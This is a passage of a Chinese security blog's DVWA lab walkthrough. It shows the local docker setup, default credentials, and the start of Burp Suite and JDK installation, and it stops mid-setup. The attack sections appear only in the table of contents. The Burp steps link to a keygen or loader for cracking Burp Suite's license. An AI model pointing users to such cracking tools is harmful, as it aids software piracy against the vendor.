<!doctype html><html lang=zh-cn dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="zh-cn"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>DVWA靶场 &#183; mykaneki's blog</title><meta name=title content="DVWA靶场 &#183; mykaneki's blog"><meta name=description content="My awesome website"><link rel=canonical href=https://mykaneki.github.io/docs/dvwa/><link type=text/css rel=stylesheet href=/css/main.bundle.min.b9ea6ac1de9e040e17a3a3e7bbe17d49f4f29c24060418953590fa329ba8420aae6994d37a142bf60fdba7fd747c9e01ed54a547790b87172d9ccd7c4074b5ca.css integrity="sha512-uepqwd6eBA4Xo6Pnu+F9SfTynCQGBBiVNZD6MpuoQgquaZTTehQr9g/bp/10fJ4B7VSlR3kLhxctnM18QHS1yg=="><script type=text/javascript src=/js/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="></script>
<script type=text/javascript src=/js/appearance.min.f94f4c4636d9e3ec8f5ee53cdc8ffa3d01bf87cd92ac85e6797550b1e2b80dc9118d838f3eb24c55109352455e72ff082dfe560283154e5a8f87fd75107b59c4.js integrity="sha512-+U9MRjbZ4+yPXuU83I/6PQG/h82SrIXmeXVQseK4DckRjYOPPrJMVRCTUkVecv8ILf5WAoMVTlqPh/11EHtZxA=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ+dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5+a8AgFUkA==" data-copy data-copied></script>
<script src=/js/zoom.min.js></script>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="DVWA靶场"><meta property="og:description" content="环境搭建> 环境搭建 # kali + docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa 打开网页 http://127.0.0.1/index.php
点击Create / Reset database
Username：admin Password：password
安装及配置BurpSuite> 安装及配置BurpSuite # 下载所需要的文件
Releases · h3110w0r1d-y/BurpLoaderKeygen (github.com)
​	Burp Suite Release Notes (portswigger."><meta property="og:type" content="article"><meta property="og:url" content="https://mykaneki.github.io/docs/dvwa/"><meta property="og:image" content="https://mykaneki.github.io/docs/dvwa/featured.jpg"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-09-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-03T00:00:00+00:00"><meta property="og:site_name" content="mykaneki's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://mykaneki.github.io/docs/dvwa/featured.jpg"><meta name=twitter:title content="DVWA靶场"><meta name=twitter:description content="环境搭建> 环境搭建 # kali + docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa 打开网页 http://127.0.0.1/index.php
点击Create / Reset database
Username：admin Password：password
安装及配置BurpSuite> 安装及配置BurpSuite # 下载所需要的文件
Releases · h3110w0r1d-y/BurpLoaderKeygen (github.com)
​	Burp Suite Release Notes (portswigger."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Docs","name":"DVWA靶场","headline":"DVWA靶场","abstract":"环境搭建\u003e 环境搭建 # kali \u002b docker\ndocker run --rm -it -p 80:80 vulnerables\/web-dvwa 打开网页 http:\/\/127.0.0.1\/index.php\n点击Create \/ Reset database\nUsername：admin Password：password\n安装及配置BurpSuite\u003e 安装及配置BurpSuite # 下载所需要的文件\nReleases · h3110w0r1d-y\/BurpLoaderKeygen (github.com)\n​\tBurp Suite Release Notes (portswigger.","inLanguage":"zh-cn","url":"https:\/\/mykaneki.github.io\/docs\/dvwa\/","author":{"@type":"Person","name":"mykaneki"},"copyrightYear":"2022","dateCreated":"2022-09-03T00:00:00\u002b00:00","datePublished":"2022-09-03T00:00:00\u002b00:00","dateModified":"2022-09-03T00:00:00\u002b00:00","keywords":["DVWA","安全"],"mainEntityOfPage":"true","wordCount":"1633"}]</script><meta name=author content="mykaneki"><link href=cmy_kaneki@qq.com rel=me><link href=https://github.com/mykaneki rel=me><script async src="https://www.googletagmanager.com/gtag/js?id=G-5MM4NB6CC9"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5MM4NB6CC9",{anonymize_ip:!1})}</script><script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js></script>
<script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js></script>
<script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js></script>
<script>const firebaseConfig={apiKey:"AIzaSyC5UrDhesjW3q1GpRz06wXtA8mFaJzCORk",authDomain:"AIzaSyC5UrDhesjW3q1GpRz06wXtA8mFaJzCORk",projectId:"mykaneki-github-page",storageBucket:"mykaneki-github-page.appspot.com",messagingSenderId:"615146370767",appId:"1:615146370767:web:ffa28dccc2b7017e77a9ba",measurementId:"G-5MM4NB6CC9"};var app=firebase.initializeApp(firebaseConfig),db=firebase.firestore(),auth=firebase.auth()</script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div style=padding-left:0;padding-right:0 class="flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3"><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mykaneki&rsquo;s blog</a></nav><div class="hidden md:flex items-center space-x-5 md:ml-12"><a href=/docs/ class="text-base font-medium text-gray-500 hover:text-gray-900" title=Docs>文档</a>
<a href=/posts/ class="text-base font-medium text-gray-500 hover:text-gray-900" title=Posts>文章</a>
<a href=/series/ class="text-base font-medium text-gray-500 hover:text-gray-900" title=Series>系列</a>
<button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"><button id=appearance-switcher type=button><div class="flex items-center justify-center h-12 dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden h-12 dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="flex md:hidden items-center space-x-5 md:ml-12"><span></span>
<button id=search-button-mobile class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button>
<button id=appearance-switcher-mobile type=button style=margin-right:5px><div class="flex items-center justify-center h-12 dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden h-12 dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 -mr-2 md:hidden"><label id=menu-button for=menu-controller class=block><input type=checkbox id=menu-controller class=hidden><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper style=padding-top:25px class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex movedown flex-col w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl sm:px-14 md:px-24 lg:px-32 sm:py-10 sm:pt-10"><li class=mb-1><span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mb-1><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/docs/ title=Docs><span class="inline-block align-text-bottom"></span>文档</a></li><li class=mb-1><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts><span class="inline-block align-text-bottom"></span>文章</a></li><li class=mb-1><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/series/ title=Series><span class="inline-block align-text-bottom"></span>系列</a></li></ul></div></label></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom" style=background-image:url(/docs/dvwa/featured_hu6087611336f87af87fcc72d0cae040d1_354120_1200x0_resize_q75_box.jpg)><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-30 dark:opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script>window.addEventListener("scroll",function(){var t=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,n=document.getElementById("background-blur");n.style.opacity=t/300})</script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Documentation</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/docs/>Docs</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/docs/dvwa/>DVWA靶场</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">DVWA靶场</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-09-03 00:00:00 +0000 UTC">2022-09-03</time><span class="px-2 text-primary-500">&#183;</span><span>1633 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_docs/DVWA/index.md title=views>0</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_docs/DVWA/index.md title=likes>0</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<button id=likes_button class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400" onclick=process_article()>
<span id=likes_button_heart style=display:none class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span><span id=likes_button_emtpty_heart class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M244 84l11.1 12 12-11.98C300.6 51.37 347 36.51 392.6 44.1 461.5 55.58 512 115.2 512 185.1V190.9c0 41.5-17.2 81.2-47.6 109.5L283.7 469.1c-7.5 7-17.4 10.9-27.7 10.9S235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1.0 232.4.0 190.9V185.1c0-69.9 50.52-129.52 119.4-141 44.7-7.59 92 7.27 124.6 39.9C243.1 84 244 84.01 244 84zm11.1 79.9-45-46.8c-21.7-20.82-52.5-30.7-82.8-25.66C81.55 99.07 48 138.7 48 185.1V190.9c0 28.2 11.71 55.2 32.34 74.4L256 429.3l175.7-164c20.6-19.2 32.3-46.2 32.3-74.4V185.1c0-46.4-33.6-86.03-79.3-93.66C354.4 86.4 323.6 96.28 301.9 117.1l-46.8 46.8z"/></svg></span></span><span id=likes_button_text>&nbsp;Like</span></button></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/dvwa/")'><span class=flex><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">DVWA</span></span></span>
<span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/%E5%AE%89%E5%85%A8/")'><span class=flex><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">安全</span></span></span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10"><details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#环境搭建>环境搭建</a></li><li><a href=#安装及配置burpsuite>安装及配置BurpSuite</a></li><li><a href=#密码爆破>密码爆破</a><ul><li><a href=#low>low</a></li><li><a href=#medium>medium</a></li><li><a href=#high>high</a></li><li><a href=#impossible>impossible</a></li><li><a href=#总结与防御>总结与防御</a></li></ul></li><li><a href=#command-injection命令注入>command injection命令注入</a><ul><li><a href=#low-1>low</a></li><li><a href=#medium-1>medium</a></li><li><a href=#high-1>high</a></li><li><a href=#impossible-1>impossible</a></li><li><a href=#总结与防御-1>总结与防御</a></li></ul></li><li><a href=#跨站请求伪造-csrf>跨站请求伪造 CSRF</a><ul><li><a href=#low-2>low</a></li><li><a href=#medium-2>medium</a></li><li><a href=#high-2>high</a></li><li><a href=#impossible-2>impossible</a></li><li><a href=#总结与防御-2>总结与防御</a></li></ul></li><li><a href=#文件包含-file-inclusion>文件包含 File Inclusion</a><ul><li><a href=#low-3>low</a></li><li><a href=#medium-3>medium</a></li><li><a href=#high-3>high</a></li><li><a href=#impossible-3>impossible</a></li><li><a href=#总结与防御-3>总结与防御</a></li></ul></li><li><a href=#文件上传-file-upload>文件上传 File Upload</a><ul><li><a href=#low-4>low</a></li><li><a href=#medium-4>medium</a></li><li><a href=#high-4>high</a></li><li><a href=#impossible-4>impossible</a></li><li><a href=#总结与防御-4>总结与防御</a></li></ul></li><li><a href=#nsecure-captcha-不安全的验证码>nsecure CAPTCHA （不安全的验证码）</a><ul><li><a href=#low-5>low</a></li><li><a href=#medium-5>medium</a></li><li><a href=#high-5>high</a></li><li><a href=#impossible-5>impossible</a></li></ul></li><li><a href=#sql-injectionsql注入>SQL Injection（SQL注入）</a><ul><li><a href=#low-6>low</a></li><li><a href=#medium-6>medium</a></li><li><a href=#high-6>high</a></li><li><a href=#impossible-6>impossible</a></li><li><a href=#总结与防御-5>总结与防御</a></li></ul></li><li><a href=#sql-injection-blindsql盲注>SQL Injection Blind（SQL盲注）</a><ul><li><a href=#low-7>low</a></li><li><a href=#medium-7>medium</a></li><li><a href=#high-7>high</a></li><li><a href=#impossible-7>impossible</a></li><li><a href=#总结与防御-6>总结与防御</a></li></ul></li><li><a href=#xssreflected反射型跨站脚本>XSS（Reflected）（反射型跨站脚本）</a><ul><li><a href=#low-8>low</a></li><li><a href=#medium-8>medium</a></li><li><a href=#high-8>high</a></li><li><a href=#impossible-8>impossible</a></li><li><a href=#总结与防御-7>总结与防御</a></li></ul></li><li><a href=#xssstored存储型跨站脚本>XSS（Stored）（存储型跨站脚本）</a><ul><li><a href=#low-9>low</a></li><li><a href=#medium-9>medium</a></li><li><a href=#high-9>high</a></li><li><a href=#impossible-9>impossible</a></li><li><a href=#总结与防御-8>总结与防御</a></li></ul></li></ul></nav></div></details><details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#环境搭建>环境搭建</a></li><li><a href=#安装及配置burpsuite>安装及配置BurpSuite</a></li><li><a href=#密码爆破>密码爆破</a><ul><li><a href=#low>low</a></li><li><a href=#medium>medium</a></li><li><a href=#high>high</a></li><li><a href=#impossible>impossible</a></li><li><a href=#总结与防御>总结与防御</a></li></ul></li><li><a href=#command-injection命令注入>command injection命令注入</a><ul><li><a href=#low-1>low</a></li><li><a href=#medium-1>medium</a></li><li><a href=#high-1>high</a></li><li><a href=#impossible-1>impossible</a></li><li><a href=#总结与防御-1>总结与防御</a></li></ul></li><li><a href=#跨站请求伪造-csrf>跨站请求伪造 CSRF</a><ul><li><a href=#low-2>low</a></li><li><a href=#medium-2>medium</a></li><li><a href=#high-2>high</a></li><li><a href=#impossible-2>impossible</a></li><li><a href=#总结与防御-2>总结与防御</a></li></ul></li><li><a href=#文件包含-file-inclusion>文件包含 File Inclusion</a><ul><li><a href=#low-3>low</a></li><li><a href=#medium-3>medium</a></li><li><a href=#high-3>high</a></li><li><a href=#impossible-3>impossible</a></li><li><a href=#总结与防御-3>总结与防御</a></li></ul></li><li><a href=#文件上传-file-upload>文件上传 File Upload</a><ul><li><a href=#low-4>low</a></li><li><a href=#medium-4>medium</a></li><li><a href=#high-4>high</a></li><li><a href=#impossible-4>impossible</a></li><li><a href=#总结与防御-4>总结与防御</a></li></ul></li><li><a href=#nsecure-captcha-不安全的验证码>nsecure CAPTCHA （不安全的验证码）</a><ul><li><a href=#low-5>low</a></li><li><a href=#medium-5>medium</a></li><li><a href=#high-5>high</a></li><li><a href=#impossible-5>impossible</a></li></ul></li><li><a href=#sql-injectionsql注入>SQL Injection（SQL注入）</a><ul><li><a href=#low-6>low</a></li><li><a href=#medium-6>medium</a></li><li><a href=#high-6>high</a></li><li><a href=#impossible-6>impossible</a></li><li><a href=#总结与防御-5>总结与防御</a></li></ul></li><li><a href=#sql-injection-blindsql盲注>SQL Injection Blind（SQL盲注）</a><ul><li><a href=#low-7>low</a></li><li><a href=#medium-7>medium</a></li><li><a href=#high-7>high</a></li><li><a href=#impossible-7>impossible</a></li><li><a href=#总结与防御-6>总结与防御</a></li></ul></li><li><a href=#xssreflected反射型跨站脚本>XSS（Reflected）（反射型跨站脚本）</a><ul><li><a href=#low-8>low</a></li><li><a href=#medium-8>medium</a></li><li><a href=#high-8>high</a></li><li><a href=#impossible-8>impossible</a></li><li><a href=#总结与防御-7>总结与防御</a></li></ul></li><li><a href=#xssstored存储型跨站脚本>XSS（Stored）（存储型跨站脚本）</a><ul><li><a href=#low-9>low</a></li><li><a href=#medium-9>medium</a></li><li><a href=#high-9>high</a></li><li><a href=#impossible-9>impossible</a></li><li><a href=#总结与防御-8>总结与防御</a></li></ul></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><div id=环境搭建 class=anchor>环境搭建></div><h2 class="relative group">环境搭建
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba aria-label=锚点>#</a></span></h2><p><strong>kali + docker</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run --rm -it -p 80:80 vulnerables/web-dvwa
</span></span></code></pre></div><p>打开网页 http://127.0.0.1/index.php</p><p>点击<code>Create / Reset database</code></p><p>Username：<code>admin</code> Password：<code>password</code></p><div id=安装及配置burpsuite class=anchor>安装及配置BurpSuite></div><h2 class="relative group">安装及配置BurpSuite
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e5%ae%89%e8%a3%85%e5%8f%8a%e9%85%8d%e7%bd%aeburpsuite aria-label=锚点>#</a></span></h2><ol><li><p>下载所需要的文件</p><p><a href=https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases target=_blank>Releases · h3110w0r1d-y/BurpLoaderKeygen (github.com)</a></p></li></ol><p>​ <a href=https://portswigger.net/burp/releases target=_blank>Burp Suite Release Notes (portswigger.net)</a></p><p>​ <a href=https://www.oracle.com/java/technologies/downloads/#java11 target=_blank>Java Downloads | Oracle</a></p><ol start=2><li><p>配置JDK11</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tar -xzvf jdk-8u191-linux-x64.tar.gz
</span></span><span style=display:flex><span>sudo cp -r jdk1.8.0_191 /opt
</span></span><span style=display:flex><span>cd /opt/jdk1.8.0_191
</span></span><span style=display:flex><span>touch ~/.local_profile <span style=color:#75715e>#创建公共脚本</span>
</span></span><span style=display:flex><span>vim ~/.local_profile <span style=color:#75715e>#写入环境变量</span>
</span></span><span style=display:flex><span>
